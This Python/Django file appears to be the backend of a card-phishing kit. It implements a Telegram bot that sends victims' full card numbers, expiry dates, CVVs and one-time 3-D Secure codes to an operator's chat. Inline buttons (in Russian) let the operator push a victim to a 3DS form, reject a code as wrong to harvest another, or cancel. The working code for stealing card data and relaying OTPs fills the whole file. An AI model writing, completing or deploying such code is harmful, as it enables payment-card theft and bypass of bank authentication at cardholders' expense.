import json
from io import BytesIO

import requests
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings
from payments.models import Payment


@csrf_exempt
def telegram_webhook(request):
    if request.method == "POST":
        data = json.loads(request.body)
        if "message" in data:
            chat_id = data["message"]["chat"]["id"]
            text = data["message"].get("text", "")

            if text == "/start":
                send_message(chat_id, "Салам Алейкум")

        elif "callback_query" in data:
            callback_query = data["callback_query"]
            chat_id = callback_query["message"]["chat"]["id"]
            callback_data = callback_query["data"]

            # Extract action and payment_id
            if ":" in callback_data:
                print(callback_data)
                action, payment_id = callback_data.split(":", 1)
            else:
                action, payment_id = callback_data, None

            if action == "opened" and payment_id:
                try:
                    payment = Payment.objects.get(payment_id=payment_id)
                    payment.status = action
                    payment.errors = None
                    payment.save()
                    send_message(chat_id, "Перенаправлено на 3ds форму! Ожидаем OTP.")
                except Payment.DoesNotExist:
                    send_message(chat_id, "Payment not found.")

            elif action == "opened-errors" and payment_id:
                try:
                    payment = Payment.objects.get(payment_id=payment_id)
                    payment.status = "opened"
                    payment.errors = "wrong_otp"
                    payment.save()
                    send_message(chat_id, "Перенаправлено на 3ds форму! Ожидаем OTP.")
                except Payment.DoesNotExist:
                    send_message(chat_id, "Payment not found.")
            elif action == "canceled" and payment_id:
                payment = Payment.objects.get(payment_id=payment_id)
                payment.status = action
                payment.save()
                send_message(chat_id, "Transaction Rejected.")
            else:
                send_message(chat_id, f"Unknown action: {callback_data}")

        return JsonResponse({"ok": True})
    return JsonResponse({"error": "Invalid request method."}, status=400)


def send_credit_card(chat_id, obj, *args, **kwargs):
    message = f"""
        `{obj["cardholder_name"]}`
        ------------------------------
        `{obj["card_number"]}`
        ------------------------------
        Expire: `{obj["card_expiry_date"]}`
        ------------------------------
        CVV: `{obj["card_cvv"]}`
        ------------------------------
    """

    payment_id = obj["payment_id"]
    buttons = [
        [{"text": "3ds Secure ✅", "callback_data": f"opened:{payment_id}"}],
        [{"text": "Отменить ❌", "callback_data": f"canceled:{payment_id}"}]
    ]
    send_message(chat_id, message, buttons=buttons)


def send_otp(chat_id, otp, payment_id, card_holder, card_number, *args, **kwargs):
    message = f"""
        `{card_holder}`
    ------------------------------
    `{card_number}`
    ------------------------------
    OTP Code: `{otp}`
    ------------------------------
    """

    buttons = [
        [{"text": "3ds Secure ✅", "callback_data": f"opened:{payment_id}"}],
        [{"text": "Неправильный OTP ❌", "callback_data": f"opened-errors:{payment_id}"}],
        [{"text": "Отменить ❌", "callback_data": f"canceled:{payment_id}"}]
    ]
    send_message(chat_id, message, buttons=buttons)


def send_message(chat_id, message, buttons=None, parse_mode="Markdown"):
    """
    Send a dynamic message to a Telegram chat with optional inline buttons.

    Args:
        chat_id (int): Telegram chat ID.
        message (str): The message content.
        buttons (list): List of button rows for inline keyboards. Default is None.
            Example: [[{"text": "Button1", "callback_data": "data1"}], [{"text": "Button2", "callback_data": "data2"}]]
        parse_mode (str): Parse mode for the message. Options: Markdown, HTML, None.
    """
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": parse_mode,  # Optional formatting
    }

    # Add buttons if provided
    if buttons:
        payload["reply_markup"] = {"inline_keyboard": buttons}

    # Send the message
    url = f"https://api.telegram.org/bot{settings.TELEGRAM_BOT_TOKEN}/sendMessage"
    requests.post(url, json=payload)
